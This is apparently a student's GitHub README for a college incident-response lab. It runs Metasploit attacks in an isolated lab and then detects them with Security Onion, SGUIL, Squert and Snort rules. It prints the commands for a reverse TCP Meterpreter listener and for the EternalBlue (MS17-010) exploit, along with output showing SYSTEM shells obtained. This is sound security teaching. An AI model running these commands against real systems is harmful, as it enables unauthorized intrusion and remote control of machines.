[Incident-Response-README.md](https://github.com/user-attachments/files/28326409/Incident-Response-README.md)
# 🚨 Incident Response & Network Monitoring Lab

> **Fanshawe College — Information Security Management (INFO6081)**
> A full end-to-end incident response lab simulating real-world attacks using Metasploit Framework, then detecting and analyzing them using Security Onion (SGUIL & Squert). Covers reverse shell exploitation, EternalBlue (MS17-010), Meterpreter sessions, and SIEM-based alert triage.

---

## 🛠️ Tools & Technologies Used

![Metasploit](https://img.shields.io/badge/Metasploit-2596CD?style=flat-square&logo=metasploit&logoColor=white)
![Security Onion](https://img.shields.io/badge/Security_Onion-2E7D32?style=flat-square&logo=linux&logoColor=white)
![Kali Linux](https://img.shields.io/badge/Kali_Linux-557C94?style=flat-square&logo=kalilinux&logoColor=white)
![VMware](https://img.shields.io/badge/VMware-607078?style=flat-square&logo=vmware&logoColor=white)
![Kibana](https://img.shields.io/badge/Kibana-005571?style=flat-square&logo=kibana&logoColor=white)

| Tool | Purpose |
|---|---|
| **Metasploit (multi/handler)** | Catch reverse shell from Windows target |
| **ms17_010_psexec** | EternalBlue exploit against Windows Server 2016 |
| **Meterpreter** | Post-exploitation session management |
| **SGUIL** | Real-time IDS alert monitoring on Security Onion |
| **Squert** | Web-based alert analysis and event triage |
| **Security Onion (OSSEC + Snort)** | Host & network intrusion detection |

---

## 🖥️ Lab Environment

| Machine | Role | IP |
|---|---|---|
| `F23-spokhrel157855-KALI` | Attacker — Kali Linux | `192.168.10.10` |
| `S23-SPOKHREL157` | Target 1 — Windows 2016+ | `172.16.10.10` |
| `F23-SPOKHREL157` | Target 2 — Windows Server 2016 | `172.16.20.10` |
| `spokhrel157855-SO` | Security Onion (IDS/SIEM) | localhost |
| Router, CLIENT, SERVER | Network infrastructure | — |

---

## 📌 Attack & Detection Stages

---

### Stage 1 — Reverse TCP Shell via Metasploit multi/handler

**Objective:** Set up a Metasploit listener to catch a reverse TCP connection from a compromised Windows target.

**Commands used:**
```bash
use exploit/multi/handler
set payload windows/meterpreter/reverse_tcp
set lhost 192.168.10.10
set lport 4444
exploit
```

**What happened:**
- First exploit attempt **failed** — handler could not bind to `192.168.10.10:4444:-`
- Metasploit fell back to `0.0.0.0:4444` (listening on all interfaces)
- Second attempt **succeeded** — reverse TCP handler started on `192.168.10.10:4444`
- Stage sent: **180,291 bytes** to `172.16.10.10`
- **Meterpreter session 1 opened:** `192.168.10.10:4444 → 172.16.10.10:49759` at 2023-11-25 14:46:42

**`sysinfo` output on compromised machine:**
```
Computer        : S23-SPOKHREL157
OS              : Windows 2016+ (10.0 Build 14393)
Architecture    : x64
System Language : en_CA
Domain          : WORKGROUP
Logged On Users : 1
Meterpreter     : x86/windows
```

**Why it matters:** A reverse TCP shell bypasses firewalls since the connection originates from the victim machine outward. The `sysinfo` output confirms full control of `S23-SPOKHREL157` — a Windows Server 2016 machine.

![Reverse TCP Shell - Meterpreter Session](lab09/1.png)

---

### Stage 2 — Squert Alert Analysis (Security Onion Web UI)

**Objective:** Detect and analyze the Metasploit attack using Squert, the web-based alert interface for Security Onion.

**Squert dashboard findings (2023-11-25):**

| Priority | Count | % |
|---|---|---|
| High | 1 | 1.6% |
| Low | 49 | 77.8% |
| Other | 13 | 20.6% |
| **Total Events** | **63** | — |
| **Total Signatures** | **4** | — |

**Key alert detected:**
> **ET TROJAN Possible Metasploit Payload Common Construct Bind_API (from server)**
> - Alert ID: `2025644`
> - Time: `2023-11-25 19:46:41`
> - Source: `192.168.10.10` → Destination: `172.16.10.10`
> - Protocol: TCP | Priority: **1 (HIGH)**

**Snort rule triggered:**
```
alert tcp $EXTERNAL_NET any -> $HOME_NET any
(msg:"ET TROJAN Possible Metasploit Payload Common Construct Bind_API (from server)")
classtype:trojan-activity; sid:2025644; rev:1;
metadata: attack_target Client_and_Server, deployment Perimeter
```

**Classification breakdown:**
- `compromised L1`, `attempted access`, `denial of service`, `policy violation`
- `reconnaissance`, `malicious`, `no action req'd`, `escalated event`

**Why it matters:** Security Onion's Squert correctly classified the Metasploit traffic as a **TROJAN** with priority 1 (HIGH). The Snort signature `sid:2025644` specifically identifies Metasploit bind API patterns — demonstrating how IDS signatures catch known attack frameworks even when traffic appears legitimate.

![Squert Alert Analysis - Metasploit Detected](Incident-Response/2.jpg)

---

### Stage 3 — EternalBlue Exploit (MS17-010) Against Windows Server 2016

**Objective:** Exploit the EternalBlue vulnerability (CVE-2017-0144) on `172.16.20.10` to gain SYSTEM-level access.

**Commands used:**
```bash
use exploit/windows/smb/ms17_010_psexec
exploit
```

**Exploit chain output:**
```
[*] Started reverse TCP handler on 192.168.10.10:4333
[*] 172.16.20.10:445 - Authenticating to 172.16.20.10 as user 'User'...
[*] 172.16.20.10:445 - Target OS: Windows Server 2016 Datacenter 14393
[*] 172.16.20.10:445 - Built a write-what-where primitive...
[+] 172.16.20.10:445 - Overwrite complete... SYSTEM session obtained!
[*] 172.16.20.10:445 - Selecting PowerShell target
[*] 172.16.20.10:445 - Executing the payload...
[*] Sending stage (206,403 bytes) to 172.16.20.10
[*] Meterpreter session 3 opened (192.168.10.10:4333 → 172.16.20.10:49699)
```

**`sysinfo` on compromised server:**
```
Computer        : F23-SPOKHREL157
OS              : Windows Server 2016+ (10.0 Build 14393)
Architecture    : x64
System Language : en_CA
Domain          : WORKGROUP
Logged On Users : 1
Meterpreter     : x64/windows
```

**Shell obtained:**
```
meterpreter > shell
Process 4240 created.
Channel 1 created.
Microsoft Windows [Version 10.0.14393]
C:\Windows\system32>
```

**Why it matters:** EternalBlue (MS17-010) is one of the most critical vulnerabilities ever discovered — developed by the NSA and leaked by the Shadow Brokers. It was used in the **WannaCry** and **NotPetya** ransomware attacks of 2017. This lab demonstrates full SYSTEM access obtained through SMB port 445 without any user interaction — a **zero-click remote code execution** vulnerability.

![EternalBlue MS17-010 Exploit - SYSTEM Access](Incident-Response/3.jpg)

---

### Stage 4 — SGUIL Real-Time Alert Dashboard (Security Onion)

**Objective:** Monitor and triage all real-time IDS alerts generated during the attack in SGUIL.

**SGUIL alerts captured (Nov 17–25, 2023):**

| Date/Time | Src IP | Dst IP | DPort | Event Message |
|---|---|---|---|---|
| 2023-11-17 21:50:52 | 0.0.0.0 | 0.0.0.0 | — | [OSSEC] Integrity checksum changed |
| 2023-11-17 23:18:09 | 0.0.0.0 | 0.0.0.0 | — | [OSSEC] Web server 400 error code |
| 2023-11-18 01:24:40 | 0.0.0.0 | 0.0.0.0 | — | [OSSEC] PAM: User login failed |
| 2023-11-18 01:24:40 | 0.0.0.0 | 0.0.0.0 | — | [OSSEC] unix_chkpwd: Password check failed |
| 2023-11-25 18:12:40 | 192.168.10.10 | 172.16.10.10 | — | GPL ICMP_INFO PING *NIX |
| **2023-11-25 19:46:41** | **192.168.10.10** | **172.16.10.10** | **4444** | **ET TROJAN Possible Metasploit Payload Common Construct Bind_API** |
| 2023-11-25 21:26:08 | 192.168.10.10 | 172.16.20.10 | 445 | GPL NETBIOS SMB-DS IPC$ share access |
| 2023-11-25 21:26:34 | 192.168.10.10 | 172.16.20.10 | 445 | GPL NETBIOS SMB-DS C$ share access |
| 2023-11-25 21:26:34 | 192.168.10.10 | 172.16.20.10 | 445 | ET POLICY Powershell Command NonInteractive — Lateral Movement |
| 2023-11-25 21:26:34 | 192.168.10.10 | 172.16.20.10 | 445 | ET POLICY Powershell Command With No Profile — Lateral Movement |
| 2023-11-25 21:26:34 | 192.168.10.10 | 172.16.20.10 | 445 | ET POLICY Powershell Activity Over SMB — Lateral Movement |
| 2023-11-25 21:40:22 | 172.16.20.10 | 192.168.10.10 | 4333 | **ET SCAN Suspicious inbound to mSQL port 4333** |
| 2023-11-25 21:44:37 | 172.16.20.10 | 52.142.223.178 | 80 | ET INFO Windows OS Submitting USB Metadata to Microsoft |

**Attack timeline visible in SGUIL:**
1. **OSSEC alerts** — host-based detection: file integrity changes, login failures (pre-attack reconnaissance)
2. **ICMP PING** — attacker pinged target to confirm it was alive
3. **Metasploit Bind_API** — reverse shell connection on port 4444 detected
4. **SMB share access** — EternalBlue lateral movement via IPC$ and C$ shares
5. **PowerShell over SMB** — payload execution via PowerShell (3 separate signatures fired)
6. **Suspicious port 4333** — Meterpreter session back-channel detected
7. **Windows metadata** — compromised machine phoning home to Microsoft

**Why it matters:** SGUIL shows the complete attack chain as seen by the IDS — from initial ping all the way through lateral movement and payload execution. Each row represents a Snort or OSSEC rule firing, building a timeline that an analyst would use to reconstruct the full incident.

![SGUIL Real-Time Alert Dashboard](Incident-Response/4.jpg)

---

## 🔁 Full Attack & Detection Chain

```
[1] Metasploit multi/handler → reverse TCP shell → Meterpreter session on 172.16.10.10
        ↓
[2] Squert detected it → "ET TROJAN Metasploit Bind_API" → Priority 1 HIGH alert
        ↓
[3] EternalBlue (MS17-010) → SMB port 445 → SYSTEM shell on 172.16.20.10
        ↓
[4] SGUIL logged full attack chain → ICMP → Metasploit → SMB → PowerShell → C2
```

---

## 📚 Key Takeaways

- **Reverse TCP shells** bypass firewalls — outbound traffic from victim to attacker is rarely blocked
- **EternalBlue (CVE-2017-0144)** exploits unpatched SMB (port 445) for zero-click SYSTEM access
- **Security Onion (SGUIL + Squert)** detected every stage of the attack through Snort & OSSEC rules
- **Lateral movement** via PowerShell over SMB is flagged by multiple ET POLICY signatures
- **OSSEC** detects host-based events (file changes, login failures) that network IDS cannot see
- A complete **incident timeline** can be reconstructed from SGUIL alerts alone — crucial for IR reports
- **Port 4333/4444** used for Meterpreter C2 channels were caught by Snort signature matching

---

## ⚠️ Disclaimer

> All activities were performed in a **controlled, isolated VMware lab environment** for educational purposes as part of the Fanshawe College Information Security Management program. No real systems were targeted or harmed.

---

## 👨‍💻 Author

**Sudip Pokhrel** | Information Security Analyst — GRC

[![LinkedIn](https://img.shields.io/badge/LinkedIn-Connect-0A66C2?style=flat-square&logo=linkedin&logoColor=white)](https://www.linkedin.com/in/sudip-pokhrel-3375291b3/)
[![GitHub](https://img.shields.io/badge/GitHub-Follow-181717?style=flat-square&logo=github&logoColor=white)](https://github.com/sudippokhrel33513)
